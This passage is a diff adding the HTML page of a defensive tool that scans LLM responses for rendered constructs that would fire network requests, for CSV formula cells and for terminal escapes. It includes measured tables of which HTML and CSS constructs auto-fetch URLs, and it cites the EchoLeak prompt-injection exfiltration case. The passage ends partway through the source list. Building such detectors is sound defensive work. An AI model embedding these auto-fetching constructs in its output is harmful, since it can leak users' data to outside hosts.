@@ -1,0 +1,2868 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>LLM Output Sink Scanner - see the requests your renderer would fire, without firing them</title>
+<meta name="description" content="Paste a model response, declare its sinks, and get per-sink proof: auto-fetching image URLs (reference-style definitions included), formula-leading spreadsheet cells, and terminal escapes that overwrite what you think you are reading. Nothing is ever requested.">
+<link rel="canonical" href="https://0xelitesystem.github.io/llm-output-sink-scanner/">
+<meta property="og:title" content="LLM Output Sink Scanner">
+<meta property="og:description" content="Every prompt injection tool checks what goes into the model. This checks what your app does with what comes out. Zero requests, zero dependencies, runs entirely in your tab.">
+<meta property="og:url" content="https://0xelitesystem.github.io/llm-output-sink-scanner/">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "LLM Output Sink Scanner",
+  "url": "https://0xelitesystem.github.io/llm-output-sink-scanner/",
+  "applicationCategory": "SecurityApplication",
+  "operatingSystem": "Any browser",
+  "description": "Client-side scanner for LLM output sinks. Finds auto-fetching URLs in rendered model output including reference-style markdown images, formula-leading CSV cells, and terminal control sequences. Neutralizes the input as a string before any parser sees it, so it never issues a request.",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  },
+  "author": {
+    "@type": "Organization",
+    "name": "elitesystem.ai",
+    "url": "https://elitesystem.ai"
+  },
+  "isAccessibleForFree": true
+}
+</script>
+<style>
+/* This stylesheet deliberately contains no CSS URL function of any kind, so no
+   rule the page applies to found content can itself become a network request.
+   Grep the style block for the three characters u, r, l followed by an opening
+   parenthesis: there are none. */
+:root {
+  --bg: #0a0c10;
+  --bg-2: #10141a;
+  --panel: #12171e;
+  --panel-2: #171d26;
+  --line: #232b36;
+  --line-2: #2e3846;
+  --ink: #e7eef6;
+  --ink-2: #9aa8b8;
+  --ink-3: #6b7889;
+  --accent: #56a8ff;
+  --accent-ink: #04101f;
+  --crit: #ff6b7a;
+  --high: #ff9e5a;
+  --med: #ffd15c;
+  --low: #7fb2ff;
+  --ok: #4fd1a5;
+  --shadow: 0 1px 0 rgba(255,255,255,0.03), 0 12px 32px rgba(0,0,0,0.45);
+  --mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
+  --sans: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
+  color-scheme: dark;
+}
+:root[data-theme="light"] {
+  --bg: #f4f6f9;
+  --bg-2: #eaeef4;
+  --panel: #ffffff;
+  --panel-2: #f7f9fc;
+  --line: #d9e0ea;
+  --line-2: #c3ccda;
+  --ink: #131a24;
+  --ink-2: #4d5a6b;
+  --ink-3: #6e7b8c;
+  --accent: #0b62d0;
+  --accent-ink: #ffffff;
+  --crit: #b3103a;
+  --high: #a34b00;
+  --med: #7a5a00;
+  --low: #14508f;
+  --ok: #0a6b4d;
+  --shadow: 0 1px 2px rgba(16,24,40,0.06), 0 8px 24px rgba(16,24,40,0.08);
+  color-scheme: light;
+}
+* { box-sizing: border-box; }
+html, body { max-width: 100%; overflow-x: hidden; }
+body {
+  margin: 0;
+  background: var(--bg);
+  color: var(--ink);
+  font-family: var(--sans);
+  font-size: 16px;
+  line-height: 1.6;
+  -webkit-text-size-adjust: 100%;
+}
+.wrap { max-width: 1080px; margin: 0 auto; padding: 0 16px 72px; }
+a { color: var(--accent); }
+a:focus-visible, button:focus-visible, textarea:focus-visible, input:focus-visible, summary:focus-visible, select:focus-visible {
+  outline: 3px solid var(--accent);
+  outline-offset: 2px;
+  border-radius: 4px;
+}
+h1, h2, h3 { line-height: 1.25; letter-spacing: -0.01em; }
+h1 { font-size: clamp(1.55rem, 4.2vw, 2.3rem); margin: 0 0 8px; }
+h2 { font-size: clamp(1.15rem, 2.6vw, 1.4rem); margin: 40px 0 12px; }
+h3 { font-size: 1.02rem; margin: 26px 0 10px; }
+p { margin: 0 0 12px; }
+code, kbd, pre, .mono { font-family: var(--mono); font-size: 0.86em; }
+
+/* ---------- top bar ---------- */
+.topbar {
+  position: sticky; top: 0; z-index: 20;
+  background: rgba(10,12,16,0.86);
+  backdrop-filter: blur(10px);
+  border-bottom: 1px solid var(--line);
+}
+:root[data-theme="light"] .topbar { background: rgba(244,246,249,0.9); }
+.topbar-in {
+  max-width: 1080px; margin: 0 auto; padding: 10px 16px;
+  display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
+}
+.brand { font-weight: 700; font-size: 0.95rem; letter-spacing: 0.01em; }
+.brand span { color: var(--accent); }
+.spacer { flex: 1 1 auto; }
+.pill {
+  display: inline-flex; align-items: center; gap: 6px;
+  font-size: 0.72rem; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase;
+  padding: 4px 9px; border-radius: 999px; border: 1px solid var(--line-2); color: var(--ink-2);
+  white-space: nowrap;
+}
+.pill.zero { color: var(--ok); border-color: var(--ok); }
+
+header.hero { padding: 34px 0 6px; }
+.tagline { color: var(--ink-2); font-size: 1.02rem; max-width: 72ch; }
+
+/* ---------- controls ---------- */
+button {
+  font: inherit; font-size: 0.9rem; font-weight: 600;
+  color: var(--ink); background: var(--panel-2);
+  border: 1px solid var(--line-2); border-radius: 8px;
+  padding: 8px 13px; cursor: pointer;
+  transition: background 0.12s ease, border-color 0.12s ease, transform 0.06s ease;
+}
+button:hover { border-color: var(--accent); }
+button:active { transform: translateY(1px); }
+button.primary { background: var(--accent); color: var(--accent-ink); border-color: var(--accent); }
+button.small { padding: 4px 9px; font-size: 0.78rem; font-weight: 600; }
+.btnrow { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
+
+textarea, input[type="text"] {
+  width: 100%; font-family: var(--mono); font-size: 0.84rem; line-height: 1.55;
+  color: var(--ink); background: var(--bg-2);
+  border: 1px solid var(--line-2); border-radius: 10px; padding: 12px;
+  resize: vertical;
+}
+textarea::placeholder { color: var(--ink-3); }
+label { font-weight: 600; }
+.field { margin: 0 0 14px; }
+.field > label { display: block; margin-bottom: 6px; }
+.hint { color: var(--ink-2); font-size: 0.84rem; margin: 6px 0 0; }
+
+.panel {
+  min-width: 0;
+  background: var(--panel); border: 1px solid var(--line);
+  border-radius: 14px; padding: 18px; box-shadow: var(--shadow);
+  margin: 0 0 18px;
+}
+.panel.tight { padding: 14px; }
+
+.sinkgrid { display: grid; gap: 10px; grid-template-columns: repeat(auto-fit, minmax(min(240px, 100%), 1fr)); }
+.sinkgrid > .sink { min-width: 0; }
+.sink {
+  border: 1px solid var(--line-2); border-radius: 10px; padding: 11px 12px;
+  background: var(--panel-2); display: flex; gap: 10px; align-items: flex-start;
+}
+.sink input { margin: 4px 0 0; width: 17px; height: 17px; accent-color: var(--accent); flex: 0 0 auto; }
+.sink .st { font-weight: 700; display: block; font-size: 0.92rem; }
+.sink .sd { color: var(--ink-2); font-size: 0.8rem; display: block; }
+.sink.hero-sink { border-color: var(--accent); }
+/* A flex container makes every text run and every <code> its own flex item, so
+   the sentence reflows out of reading order on a narrow screen. The text is
+   wrapped in one span for that reason; do not remove it. */
+.inline-check { display: flex; gap: 8px; align-items: flex-start; font-weight: 600; }
+.inline-check input { flex: 0 0 auto; width: 17px; height: 17px; margin: 4px 0 0; accent-color: var(--accent); }
+.inline-check > span { min-width: 0; }
+.hero-tag {
+  font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; font-weight: 800;
+  color: var(--accent); border: 1px solid var(--accent); border-radius: 4px; padding: 0 5px; margin-left: 6px;
+  white-space: nowrap;
+}
+
+/* ---------- badges that separate live computation from dated material ---------- */
+.badge {
+  display: inline-block; font-size: 0.64rem; font-weight: 800;
+  letter-spacing: 0.1em; text-transform: uppercase;
+  padding: 3px 8px; border-radius: 5px; white-space: nowrap;
+}
+.badge.live { color: var(--accent-ink); background: var(--accent); }
+.badge.snap { color: var(--ink); background: transparent; border: 1px dashed var(--line-2); }
+.snapshot {
+  border: 1px dashed var(--line-2);
+  border-left: 4px solid var(--ink-3);
+  background: var(--bg-2);
+  border-radius: 10px; padding: 14px 16px; margin: 0 0 18px;
+}
+.snapshot .stamp { color: var(--ink-2); font-size: 0.8rem; margin: 6px 0 12px; }
+.livebox { border-left: 4px solid var(--accent); }
+
+blockquote.src {
+  margin: 10px 0; padding: 10px 14px;
+  border-left: 3px solid var(--line-2); background: var(--bg-2);
+  border-radius: 0 8px 8px 0; color: var(--ink-2); font-size: 0.88rem;
+}
+blockquote.src p { margin: 0 0 6px; }
+blockquote.src p:last-child { margin: 0; }
+
+/* ---------- tables ---------- */
+.scroll-x { overflow-x: auto; -webkit-overflow-scrolling: touch; max-width: 100%; }
+table { border-collapse: collapse; width: 100%; min-width: 560px; font-size: 0.85rem; }
+th, td { text-align: left; padding: 8px 10px; border-bottom: 1px solid var(--line); vertical-align: top; }
+th { color: var(--ink-2); font-size: 0.72rem; letter-spacing: 0.06em; text-transform: uppercase; white-space: nowrap; }
+tbody tr:last-child td { border-bottom: 0; }
+td.mono, th.mono { font-family: var(--mono); }
+.yes { color: var(--crit); font-weight: 700; }
+.no { color: var(--ok); font-weight: 700; }
+
+/* ---------- findings ---------- */
+.summary-row { display: flex; gap: 10px; flex-wrap: wrap; margin: 0 0 14px; }
+.stat {
+  border: 1px solid var(--line-2); border-radius: 10px; padding: 8px 12px;
+  background: var(--panel-2); min-width: 96px;
+}
+.stat b { display: block; font-size: 1.35rem; line-height: 1.15; font-variant-numeric: tabular-nums; }
+.stat span { color: var(--ink-2); font-size: 0.72rem; letter-spacing: 0.05em; text-transform: uppercase; }
+.stat.crit b { color: var(--crit); }
+.stat.high b { color: var(--high); }
+
+.finding {
+  border: 1px solid var(--line-2); border-left-width: 4px; border-radius: 10px;
+  padding: 12px 14px; margin: 0 0 10px; background: var(--panel-2);
+  min-width: 0; overflow-wrap: anywhere;
+}
+.finding.sev-critical { border-left-color: var(--crit); }
+.finding.sev-high { border-left-color: var(--high); }
+.finding.sev-medium { border-left-color: var(--med); }
+.finding.sev-low { border-left-color: var(--low); }
+.finding.sev-info { border-left-color: var(--ink-3); }
+.f-head { display: flex; gap: 8px; align-items: baseline; flex-wrap: wrap; margin-bottom: 6px; }
+.sev {
+  font-size: 0.63rem; font-weight: 800; letter-spacing: 0.09em; text-transform: uppercase;
+  padding: 2px 7px; border-radius: 4px; border: 1px solid currentColor; white-space: nowrap;
+}
+.sev-critical .sev { color: var(--crit); }
+.sev-high .sev { color: var(--high); }
+.sev-medium .sev { color: var(--med); }
+.sev-low .sev { color: var(--low); }
+.sev-info .sev { color: var(--ink-3); }
+.f-title { font-weight: 700; }
+.f-where { color: var(--ink-3); font-size: 0.78rem; font-family: var(--mono); }
+.f-url {
+  display: block; max-width: 100%; min-width: 0; font-family: var(--mono); font-size: 0.8rem;
+  background: var(--bg-2); border: 1px solid var(--line); border-radius: 8px;
+  padding: 8px 10px; margin: 8px 0;
+  overflow-x: auto; white-space: pre; -webkit-overflow-scrolling: touch;
+}
+.f-reasons { margin: 6px 0 0; padding-left: 18px; color: var(--ink-2); font-size: 0.86rem; }
+.f-reasons li { margin: 2px 0; }
+.verdict {
+  display: inline-block; font-size: 0.72rem; font-weight: 700;
+  padding: 2px 8px; border-radius: 999px; border: 1px solid currentColor; margin-top: 6px;
+}
+.v-off { color: var(--crit); }
+.v-fwd { color: var(--crit); }
+.v-allow { color: var(--high); }
+.v-rel { color: var(--ink-2); }
+
+pre.term {
+  font-family: var(--mono); font-size: 0.8rem; line-height: 1.45;
+  max-width: 100%; min-width: 0;
+  background: #05070a; color: #d7e3f0; border: 1px solid var(--line);
+  border-radius: 8px; padding: 10px 12px; margin: 8px 0;
+  overflow-x: auto; white-space: pre; -webkit-overflow-scrolling: touch;
+}
+:root[data-theme="light"] pre.term { background: #11161d; color: #dfe8f2; }
+/* min-width:0 is required on grid and flex children: the default min-width of
+   auto lets a wide pre push the whole column past the viewport instead of
+   scrolling inside its own box. */
+.cmp { display: grid; gap: 10px; grid-template-columns: minmax(0, 1fr); }
+.cmp > div { min-width: 0; max-width: 100%; }
+@media (min-width: 720px) { .cmp { grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); } }
+.cmp h4 { margin: 0 0 4px; font-size: 0.78rem; letter-spacing: 0.06em; text-transform: uppercase; color: var(--ink-2); font-weight: 700; }
+
+.empty {
+  border: 1px dashed var(--line-2); border-radius: 12px;
+  padding: 26px 18px; text-align: center; color: var(--ink-2); background: var(--panel-2);
+}
+.empty b { display: block; color: var(--ink); font-size: 1rem; margin-bottom: 4px; }
+
+.clean { color: var(--ok); font-weight: 700; }
+.errbox {
+  border: 1px solid var(--crit); border-radius: 10px; padding: 12px 14px;
+  color: var(--crit); background: var(--panel-2); margin: 0 0 14px;
+}
+details { border: 1px solid var(--line); border-radius: 10px; padding: 10px 14px; margin: 12px 0; background: var(--bg-2); }
+details[open] { padding-bottom: 14px; }
+summary { cursor: pointer; font-weight: 700; font-size: 0.92rem; }
+details > *:not(summary) { margin-top: 10px; }
+.srclist { padding-left: 18px; color: var(--ink-2); font-size: 0.88rem; }
+.srclist li { margin: 6px 0; }
+.srclist a { word-break: break-all; }
+
+footer {
+  border-top: 1px solid var(--line); margin-top: 46px; padding: 22px 0 0;
+  color: var(--ink-2); font-size: 0.88rem;
+}
+footer .flinks { display: flex; gap: 16px; flex-wrap: wrap; margin-bottom: 8px; }
+.visually-hidden {
+  position: absolute; width: 1px; height: 1px; margin: -1px; padding: 0;
+  overflow: hidden; clip: rect(0 0 0 0); white-space: nowrap; border: 0;
+}
+@media (max-width: 420px) {
+  .wrap { padding-left: 12px; padding-right: 12px; }
+  .panel { padding: 14px; }
+}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="topbar-in">
+    <div class="brand">output<span>/</span>sink scanner</div>
+    <span class="pill zero" title="This page issues no network requests at all">0 requests</span>
+    <div class="spacer"></div>
+    <button id="themeBtn" class="small" type="button" aria-pressed="false">Light mode</button>
+  </div>
+</div>
+
+<div class="wrap">
+
+<header class="hero">
+  <h1>LLM Output Sink Scanner</h1>
+  <p class="tagline">
+    Every prompt injection tool checks what goes <em>into</em> the model. This one checks what your
+    app does with what comes <em>out</em>. Paste a model response, declare where you send it, and get
+    per-sink proof of what would happen. It never fires a request; it shows you the request your
+    renderer would have fired.
+  </p>
+</header>
+
+<h2>1. Paste the model response</h2>
+<div class="panel">
+  <div class="field">
+    <label for="src">Model response (the raw text your app received)</label>
+    <textarea id="src" rows="14" spellcheck="false" aria-describedby="srcHelp"
+      placeholder="Paste the assistant message, tool result, or agent transcript here."></textarea>
+    <p class="hint" id="srcHelp">
+      Nothing leaves your browser. The text is neutralized as a <em>string</em> before any parser
+      touches it, which is why loading a hostile response here cannot leak anything.
+      Escaped control sequences such as <code>\x1b</code>, <code>\u001b</code>, <code>\033</code>,
+      <code>\e</code>, <code>\r</code> and <code>\t</code> are understood as well as real control bytes,
+      so a response copied out of a JSON log still analyses correctly.
+    </p>
+    <div class="btnrow" style="margin-top:10px">
+      <button id="sampleBtn" type="button">Load sample</button>
+      <button id="clearBtn" type="button">Clear</button>
+      <span class="hint" id="charCount" aria-live="polite">0 characters</span>
+    </div>
+  </div>
+</div>
+
+<h2>2. Declare the sinks</h2>
+<div class="panel">
+  <div class="sinkgrid">
+    <label class="sink hero-sink">
+      <input type="checkbox" id="sinkRender" checked>
+      <span>
+        <span class="st">Rendered as HTML<span class="hero-tag">hero</span></span>
+        <span class="sd">Markdown or HTML shown in a chat bubble, web page, email client or webview.</span>
+      </span>
+    </label>
+    <label class="sink">
+      <input type="checkbox" id="sinkCsv" checked>
+      <span>
+        <span class="st">Written to CSV or a spreadsheet</span>
+        <span class="sd">Exported, appended to a sheet, or handed to a spreadsheet library.</span>
+      </span>
+    </label>
+    <label class="sink">
+      <input type="checkbox" id="sinkTerm" checked>
+      <span>
+        <span class="st">Printed to a terminal</span>
+        <span class="sd">Agent console, CI log viewer, or anything that interprets ANSI escapes.</span>
+      </span>
+    </label>
+  </div>
+
+  <div class="field" style="margin-top:16px">
+    <label for="allow">Host allowlist for the render sink (one per line, <code>*.example.com</code> allowed)</label>
+    <textarea id="allow" rows="3" spellcheck="false" aria-describedby="allowHelp"
+      placeholder="assets.yourapp.example&#10;*.static.yourapp.example"></textarea>
+    <p class="hint" id="allowHelp">
+      An allowlist is not a boundary. If an allowlisted host will fetch a URL on your behalf, it is a
+      pass-through, so this tool never marks an allowlisted destination as safe. See the case receipt
+      under the render findings.
+    </p>
+  </div>
+
+  <div class="field">
+    <label class="inline-check">
+      <input type="checkbox" id="decodeEsc" checked>
+      <span>Interpret backslash escapes (<code>\x1b</code>, <code>\033</code>, <code>\e</code>, <code>\r</code>) as control bytes</span>
+    </label>
+    <p class="hint">Turn this off if your response legitimately contains literal backslash sequences.</p>
+  </div>
+
+  <div class="btnrow">
+    <button id="scanBtn" class="primary" type="button">Scan output</button>
+    <span class="hint" id="scanStatus" role="status" aria-live="polite"></span>
+  </div>
+</div>
+
+<h2>Findings</h2>
+<div id="errSlot" aria-live="assertive"></div>
+<div id="results">
+  <div class="empty">
+    <b>No response loaded yet</b>
+    Paste a model response above, or press <strong>Load sample</strong> to see a hostile one that
+    exercises all three sinks at once.
+  </div>
+</div>
+
+<h2>Reference: what actually fires a request</h2>
+<p class="hint" style="max-width:76ch">
+  The tables below are a dated measurement, not a live computation. They exist so you can see the
+  evidence behind the classifications above, and they are kept visually separate so that a row going
+  stale can never make the scanner's own logic look wrong. The scanner's findings are computed from
+  your input every time you press Scan.
+</p>
+
+<div class="snapshot">
+  <span class="badge snap">Measured snapshot</span>
+  <p class="stamp">
+    Method: a local HTTP server that logs every path it is asked for, one page containing each
+    construct pointing at a unique path, loaded once in a real browser. Measured 2026-08-09 in
+    Microsoft Edge 151.0.4129.72 (Chromium) on Windows 10. Only the constructs listed were tested.
+  </p>
+
+  <h3>Constructs that fired a request</h3>
+  <div class="scroll-x">
+    <table>
+      <caption class="visually-hidden">Constructs measured to fire a network request</caption>
+      <thead><tr><th>Construct</th><th>Shape</th><th>Note</th></tr></thead>
+      <tbody>
+        <tr><td>Image source</td><td class="mono">img src</td><td>The baseline case.</td></tr>
+        <tr><td>Image candidate set</td><td class="mono">img srcset</td><td>Fires even with no <span class="mono">src</span> present.</td></tr>
+        <tr><td>Picture source</td><td class="mono">source srcset</td><td>Selected candidate is fetched; the fallback img was not.</td></tr>
+        <tr><td>Media source</td><td class="mono">video src, audio src, source src</td><td>Audio fired with preload set to auto.</td></tr>
+        <tr><td>Video poster</td><td class="mono">video poster</td><td>Fetched before any play.</td></tr>
+        <tr><td>Object data</td><td class="mono">object data</td><td></td></tr>
+        <tr><td>Embed source</td><td class="mono">embed src</td><td></td></tr>
+        <tr><td>Image input</td><td class="mono">input type=image src</td><td>Only for type image.</td></tr>
+        <tr><td>Inline frame</td><td class="mono">iframe src</td><td></td></tr>
+        <tr><td>Inline frame document</td><td class="mono">iframe srcdoc</td><td>An img nested inside the srcdoc value fired too.</td></tr>
+        <tr><td>Preload</td><td class="mono">link rel=preload as=image</td><td>Also fired with <span class="mono">as=script</span>, <span class="mono">as=style</span> and <span class="mono">as=font</span>.</td></tr>
+        <tr><td>Stylesheet</td><td class="mono">link rel=stylesheet</td><td></td></tr>
+        <tr><td>Favicon</td><td class="mono">link rel=icon</td><td></td></tr>
+        <tr><td>Legacy favicon</td><td class="mono">link rel="shortcut icon"</td><td></td></tr>
+        <tr><td>Prefetch</td><td class="mono">link rel=prefetch</td><td></td></tr>
+        <tr><td>Prerender</td><td class="mono">link rel=prerender</td><td>The prerendered document was requested.</td></tr>
+        <tr><td>Module preload</td><td class="mono">link rel=modulepreload</td><td></td></tr>
+        <tr><td>Web app manifest</td><td class="mono">link rel=manifest</td><td>The manifest JSON was requested.</td></tr>
+        <tr><td>Style attribute</td><td class="mono">style="background:url(...)"</td><td>Also fired on <span class="mono">&lt;div/style=</span> with a slash separator.</td></tr>
+        <tr><td>Style element rule</td><td class="mono">&lt;style&gt; ... url(...)</td><td>Fires when a matching element exists.</td></tr>
+        <tr><td>Style element import</td><td class="mono">&lt;style&gt; @import url(...)</td><td>Fired when the at-rule preceded the other rules. Placed after a rule it was ignored, which is the CSS ordering requirement. The scanner reports it either way.</td></tr>
+        <tr><td>Web font</td><td class="mono">@font-face src</td><td>Fired once the family was actually used by a rule.</td></tr>
+        <tr><td>Other CSS URL properties</td><td class="mono">border-image-source, cursor, list-style-image, mask-image</td><td>All four fired.</td></tr>
+        <tr><td>SVG raster image</td><td class="mono">svg image href</td><td></td></tr>
+        <tr><td>SVG legacy link</td><td class="mono">svg image xlink:href</td><td>Uppercase <span class="mono">XLINK:HREF</span> fired too.</td></tr>
+        <tr><td>SVG external use</td><td class="mono">svg use href="file.svg#id"</td><td>See the note below this table.</td></tr>
+        <tr><td>SVG filter image</td><td class="mono">svg feImage href</td><td></td></tr>
+        <tr><td>Legacy background attribute</td><td class="mono">table background</td><td>Fired on a table. Did <em>not</em> fire on a div.</td></tr>
+        <tr><td>Meta refresh</td><td class="mono">meta http-equiv=refresh</td><td>The navigation itself is a GET.</td></tr>
+        <tr><td>Detached element</td><td class="mono">createElement("img") + setAttribute("src", ...)</td><td>Never inserted into the document. Fired anyway.</td></tr>
+        <tr><td>Detached innerHTML</td><td class="mono">div.innerHTML = "&lt;img src=...&gt;" (div not in the document)</td><td>Never inserted into the document. Fired anyway.</td></tr>
+        <tr><td>Separator quirks</td><td class="mono">img/src=, LF CR TAB FF before the name, space or newline before =, unquoted value, SRC, SrC</td><td>All fired. This is why the neutralizer does not assume a single space.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Constructs that did not fire a request</h3>
+  <div class="scroll-x">
+    <table>
+      <caption class="visually-hidden">Constructs measured not to fire a network request</caption>
+      <thead><tr><th>Construct</th><th>Result</th><th>Note</th></tr></thead>
+      <tbody>
+        <tr><td class="mono">@import inside a style <em>attribute</em></td><td class="no">no request</td><td>An at-rule is not valid in a style attribute.</td></tr>
+        <tr><td class="mono">DOMParser parseFromString, text/html</td><td class="no">no request</td><td>Tested with img, iframe, link stylesheet and a style attribute URL.</td></tr>
+        <tr><td class="mono">DOMParser parseFromString, image/svg+xml</td><td class="no">no request</td><td>Tested with an svg image href.</td></tr>
+        <tr><td class="mono">template.innerHTML</td><td class="no">no request</td><td>Tested with img and iframe. Content stayed in the template fragment.</td></tr>
+        <tr><td class="mono">createHTMLDocument + body.innerHTML</td><td class="no">no request</td><td>Tested with img and iframe.</td></tr>
+        <tr><td class="mono">a href</td><td class="no">no request</td><td>Needs a click. Still reported, at lower severity.</td></tr>
+        <tr><td class="mono">form action</td><td class="no">no request</td><td>Needs a submit.</td></tr>
+        <tr><td class="mono">link rel=dns-prefetch</td><td class="no">no resource GET</td><td>Name resolution only; no path was requested.</td></tr>
+        <tr><td class="mono">link rel=preconnect</td><td class="no">no resource GET</td><td>Connection setup only.</td></tr>
+        <tr><td class="mono">link rel=preload with no <em>as</em></td><td class="no">no request</td><td>The same href fetched once <span class="mono">as</span> was set. This is why the tool checks for it.</td></tr>
+        <tr><td class="mono">link rel=apple-touch-icon</td><td class="no">no request</td><td>Widely assumed to fetch. It did not, so it is reported without an auto-fetch claim.</td></tr>
+        <tr><td class="mono">link rel=canonical, link rel=alternate</td><td class="no">no request</td><td></td></tr>
+        <tr><td class="mono">div background</td><td class="no">no request</td><td>The legacy attribute is not honoured on a div.</td></tr>
+        <tr><td class="mono">&amp;#115;rc= (entity in an attribute name)</td><td class="no">no request</td><td>Character references are not decoded in attribute names.</td></tr>
+        <tr><td class="mono">img alt=a/src=U</td><td class="no">no request</td><td>The slash is inside the unquoted alt value, so no src attribute exists.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3>Two places where the measurement changed the answer</h3>
+  <p style="font-size:0.92rem">
+    <strong>External SVG use.</strong> It is widely repeated that external references in
+    <span class="mono">use</span> are same-document-only in Chromium and WebKit. Whatever is true of
+    <em>rendering</em>, the <em>request</em> fired: the external .svg file was requested. For an
+    exfiltration sink only the request matters, because the data has already left by the time the
+    renderer decides whether to draw anything. MDN notes separately that browsers may apply the
+    same-origin policy to <span class="mono">use</span> and may refuse to load a cross-origin URL,
+    which is about using the result, not about whether the GET happens. So this tool treats external
+    <span class="mono">use</span> as an auto-fetch sink.
+  </p>
+  <p style="font-size:0.92rem">
+    <strong>Detached nodes still fetch.</strong> The obvious safe-looking implementation for a tool
+    like this one is "parse it into a div I never insert, then walk the DOM". Measured: a detached
+    div assigned hostile <span class="mono">innerHTML</span> fired the request, and so did an img
+    built with <span class="mono">createElement</span> and <span class="mono">setAttribute</span>.
+    Being out of the document is not inertness.
+  </p>
+</div>
+
+<div class="snapshot">
+  <span class="badge snap">Vendor documentation, quoted 2026-08-09</span>
+  <h3>Why the neutralization pass runs before any parser</h3>
+  <p style="font-size:0.92rem">
+    MDN documents the inert-document escape hatch explicitly. On
+    <span class="mono">DOMParser.parseFromString()</span>:
+  </p>
+  <blockquote class="src">
+    <p>"While the document can download resources specified in &lt;iframe&gt; and &lt;img&gt;
+    elements, it is essentially inert."</p>
+  </blockquote>
+  <p style="font-size:0.92rem">
+    That is precisely the construct this tool exists to detect. My own measurement above says the
+    request did not fire in Edge 151 today. Both statements can be true: documentation describes what
+    is permitted, a measurement describes one engine on one day, and browsers change. The tool is
+    built so the answer does not matter. Every dangerous attribute name and every resource-bearing
+    element name is rewritten on the raw <em>string</em>, before a parser of any kind is handed the
+    text. Nothing that could fetch survives to reach a parser, so the guarantee does not depend on
+    this table still being correct next year.
+  </p>
+</div>
+
+<h2>How the zero-request guarantee works</h2>
+<div class="panel">
+  <h3>The pipeline, in order</h3>
+  <ol style="margin:0 0 10px; padding-left:20px; color:var(--ink-2); font-size:0.94rem">
+    <li><strong>Mask code regions.</strong> Fenced blocks, indented blocks, code spans and HTML
+      comments are blanked out with spaces, preserving every offset so line numbers stay honest.
+      An image inside a fenced code block is not a finding.</li>
+    <li><strong>Neutralize the string.</strong> A single pass rewrites
+      <span class="mono">src</span>, <span class="mono">srcset</span>, <span class="mono">srcdoc</span>,
+      <span class="mono">href</span>, <span class="mono">xlink:href</span>, <span class="mono">data</span>,
+      <span class="mono">poster</span>, <span class="mono">background</span>, <span class="mono">style</span>
+      and a dozen more to inert <span class="mono">data-sink-*</span> names, and renames
+      <span class="mono">style</span>, <span class="mono">link</span>, <span class="mono">base</span>
+      and <span class="mono">meta</span> elements to inert custom elements. The separator class is
+      space, tab, line feed, form feed, carriage return and slash, because all six were measured to
+      work.</li>
+    <li><strong>Then parse.</strong> Only the neutralized string is parsed, by a pure tokenizer that
+      runs anywhere, plus an optional cross-check with the browser's own parser on the same
+      neutralized string.</li>
+    <li><strong>Resolve markdown structure.</strong> Escaping HTML is not a fix, because a markdown
+      image contains no HTML. Inline, full reference, collapsed and shortcut forms are all resolved
+      against definitions collected from the whole document, so a definition forty lines away from
+      its use is still found.</li>
+    <li><strong>Render results as text only.</strong> Found URLs go into the page as text nodes.
+      The stylesheet contains no <span class="mono">url()</span> token anywhere, so no rule applied
+      to a finding can become a request either.</li>
+  </ol>
+  <p class="hint">
+    The neutralizer was tested the same way the reference tables were: every construct measured to
+    fire was run through it and the result was inserted into a live, attached div in a real page.
+    Zero requests.
+  </p>
+</div>
+
+<h2>Sources</h2>
+<div class="panel tight">
+  <ul class="srclist">
+    <li>CVE record for CVE-2025-32711, published 2025-06-11 (authoritative CVE Services record)
+      <a href="https://www.cve.org/CVERecord?id=CVE-2025-32711" rel="noopener">cve.org/CVERecord?id=CVE-2025-32711</a></li>
+    <li>Microsoft Security Response Center advisory for CVE-2025-32711
+      <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711" rel="noopener">msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711</a></li>
+    <li>Aim Labs, "EchoLeak" research write-up (the reporting researchers)
+      <a href="https://www.aim.security/lp/aim-labs-echoleak-blogpost" rel="noopener">aim.security/lp/aim-labs-echoleak-blogpost</a>.
+      Checked 2026-08-09: that address now returns a permanent redirect away from the write-up, so the
+      quotations above were read from the
+      <a href="https://web.archive.org/web/20250616001121/https://www.aim.security/lp/aim-labs-echoleak-blogpost" rel="noopener">archived 2025-06-16 snapshot</a>,
+      which still serves the original page.</li>
+    <li>OWASP, CSV Injection
+      <a href="https://owasp.org/www-community/attacks/CSV_Injection" rel="noopener">owasp.org/www-community/attacks/CSV_Injection</a></li>
+    <li>CommonMark Spec 0.31.2, link reference definitions and fenced code blocks
+      <a href="https://spec.commonmark.org/0.31.2/" rel="noopener">spec.commonmark.org/0.31.2</a></li>
+    <li>XTerm Control Sequences
+      <a href="https://invisible-island.net/xterm/ctlseqs/ctlseqs.html" rel="noopener">invisible-island.net/xterm/ctlseqs/ctlseqs.html</a></li>
+    <li>iTerm2 documentation, escape codes, which documents the OSC 8 hyperlink syntax
+      <a href="https://iterm2.com/documentation-escape-codes.html" rel="noopener">iterm2.com/documentation-escape-codes.html</a></li>
+    <li>MDN, DOMParser.parseFromString()
+      <a href="https://developer.mozilla.org/en-US/docs/Web/API/DOMParser/parseFromString" rel="noopener">developer.mozilla.org/en-US/docs/Web/API/DOMParser/parseFromString</a></li>
+    <li>MDN, SVG use element
+      <a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/use" rel="noopener">developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/use</a></li>
+    <li>Input-side companion tool, MCP Tool Poisoning Scanner
